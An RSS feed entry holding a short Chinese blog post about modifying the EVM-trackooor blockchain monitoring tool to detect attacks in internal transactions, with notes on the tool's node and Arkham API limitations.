        <guid>https://byebydoggy.github.io/post/2025/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%B7%A5%E5%85%B7evm-trackooor/</guid>
        <description>&lt;img src="https://byebydoggy.github.io/cover.png" alt="Featured image of post 区块链扫描工具EVM-Trackooor" /&gt;&lt;h1 id=&#34;原工具地址&#34;&gt;原工具地址
&lt;/h1&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Zellic/EVM-trackooor&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;github地址&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;部分优化&#34;&gt;部分优化
&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;原工具依赖go-ethereum,目前仅支持1-3三种transaction type，ETH主网目前有第4种交易类型，非主网的交易类型更多。因此在events事件以及block刷新前过滤掉3种基本交易类型外的transaction，总体影响不大。&lt;/li&gt;
&lt;li&gt;原工具检测的攻击行为全部是外部交易，然而目前黑客攻击基本都隐藏在内部交易中，需要基于交易详细日志去检测。 新增基于监控地址内部转移价值不平衡，Genois Safe Proxy权限转移等异常特征。&lt;/li&gt;
&lt;li&gt;使用arkm威胁情报平台搜素主流项目的监控地址&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;问题&#34;&gt;问题
&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;需本地部署节点以实时查询日志信息，若使用第三方RPC节点成本高于本地部署。&lt;/li&gt;
&lt;li&gt;ARKM需要申请API，目前申请难度较高，&lt;del&gt;计划前端逆向获取相关数据(待更新)&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;使用前端逆向免费查询项目关联地址 &lt;a class=&#34;link&#34; href=&#34;https://byebydoggy.github.io/post/2025/ARKM%e5%89%8d%e7%ab%af%e9%80%86%e5%90%91&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;github地址&lt;/a&gt;
~~&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        
    </channel>
</rss>
